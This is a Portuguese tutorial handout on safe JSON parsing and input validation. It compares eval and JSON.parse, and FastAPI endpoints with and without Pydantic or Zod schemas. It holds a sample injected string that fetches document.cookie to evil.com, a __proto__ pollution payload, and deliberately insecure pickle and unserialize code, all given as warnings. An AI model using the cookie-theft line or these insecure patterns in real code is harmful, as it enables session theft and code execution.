# Code Examples: JSON, Serialização e Validação

## Exemplo 1: Parsing inseguro com eval (JavaScript)

O instrutor demonstra no navegador como JSON pode ser parseado de forma insegura:

```html
<script>
  // Simulando entrada do usuário (JSON string)
  const userInput = '{"name": "João", "email": "joao@email.com"}'

  // INSEGURO: eval transforma qualquer string em código executável
  const parsed1 = eval('(' + userInput + ')')
  console.log(parsed1) // {name: "João", email: "joao@email.com"}

  // INSEGURO: new Function também executa código arbitrário
  const parsed2 = new Function('return ' + userInput)()
  console.log(parsed2) // {name: "João", email: "joao@email.com"}

  // SEGURO: JSON.parse só aceita JSON válido
  const parsed3 = JSON.parse(userInput)
  console.log(parsed3) // {name: "João", email: "joao@email.com"}
</script>
```

**Por que eval é perigoso na prática:**
```javascript
// Se o atacante injeta código no input:
const maliciousInput = '{"name": "João"}; fetch("https://evil.com/steal?cookie=" + document.cookie)'

// eval EXECUTA o código malicioso
eval('(' + maliciousInput + ')') // Cookies roubados!

// JSON.parse REJEITA com erro de sintaxe
JSON.parse(maliciousInput) // SyntaxError: Unexpected token ;
```

## Exemplo 2: API sem validação (FastAPI — INSEGURO)

```python
from fastapi import FastAPI

app = FastAPI()

@app.post("/person")
def save_person(person: dict) -> dict:
    # Aceita qualquer JSON válido
    return person
```

**Teste com dados válidos:**
```json
// Request
{"name": "João", "email": "joao@email.com"}

// Response: 200 OK
{"name": "João", "email": "joao@email.com"}
```

**Teste com prototype pollution:**
```json
// Request — atacante injeta __proto__
{"name": "João", "__proto__": {"isAdmin": true}}

// Response: 200 OK — ACEITO sem questionar
{"name": "João", "__proto__": {"isAdmin": true}}
```

**Teste com propriedades extras:**
```json
// Request — atacante adiciona campos arbitrários
{"name": "João", "email": "joao@email.com", "role": "admin", "salary": 999999}

// Response: 200 OK — tudo aceito e potencialmente salvo no banco
{"name": "João", "email": "joao@email.com", "role": "admin", "salary": 999999}
```

## Exemplo 3: API com validação (FastAPI — SEGURO)

```python
from pydantic import BaseModel
from fastapi import FastAPI

app = FastAPI()

class Person(BaseModel):
    name: str
    email: str

@app.post("/person")
def save_person(person: Person) -> Person:
    return person
```

**Teste com dados válidos:**
```json
// Request
{"name": "João", "email": "joao@email.com"}

// Response: 200 OK
{"name": "João", "email": "joao@email.com"}
```

**Teste com propriedade desconhecida:**
```json
// Request
{"name": "João", "email": "joao@email.com", "role": "admin"}

// Response: 200 OK — propriedade extra IGNORADA
{"name": "João", "email": "joao@email.com"}
```

**Teste com tipo inválido:**
```json
// Request — nome como integer em vez de string
{"name": 12345, "email": "joao@email.com"}

// Response: 422 Unprocessable Entity
{
  "detail": [
    {
      "type": "string_type",
      "loc": ["body", "name"],
      "msg": "Input should be a valid string"
    }
  ]
}
```

## Exemplo 4: Equivalente em Express + Zod (TypeScript)

```typescript
import express from 'express'
import { z } from 'zod'

const app = express()
app.use(express.json())

const personSchema = z.object({
  name: z.string().min(1),
  email: z.string().email(),
})

type Person = z.infer<typeof personSchema>

app.post('/person', (req, res) => {
  const result = personSchema.safeParse(req.body)

  if (!result.success) {
    // Retorna erros de validação detalhados
    return res.status(422).json({ errors: result.error.issues })
  }

  // result.data contém APENAS name e email
  // Propriedades extras foram removidas automaticamente
  const person: Person = result.data
  res.json(person)
})
```

## Exemplo 5: Serializadores nativos perigosos (referência)

```python
# PYTHON — pickle é perigoso com dados externos
import pickle

# NUNCA faça isso com dados do usuário
user_data = receive_from_network()
obj = pickle.loads(user_data)  # Pode executar código arbitrário!

# CORRETO
import json
user_data = receive_from_network()
obj = json.loads(user_data)  # Apenas dados, sem execução
```

```php
// PHP — unserialize é perigoso com dados externos
// NUNCA faça isso
$obj = unserialize($userInput);  // Pode instanciar classes arbitrárias!

// CORRETO
$obj = json_decode($userInput, true);  // Apenas dados
```

## Exemplo 6: Segurança em camadas

```
Camada 1: Validação de entrada (schema)
  ↓ — campos extras removidos, tipos validados
Camada 2: Regras de negócio
  ↓ — lógica de domínio aplicada
Camada 3: Banco de dados (schema forte)
  ↓ — constraints e tipos do banco
Resultado: superfície de ataque mínima
```

Cada camada que valida reduz o espaço de ataque. Não confie em apenas uma camada, mesmo que ela pareça suficiente.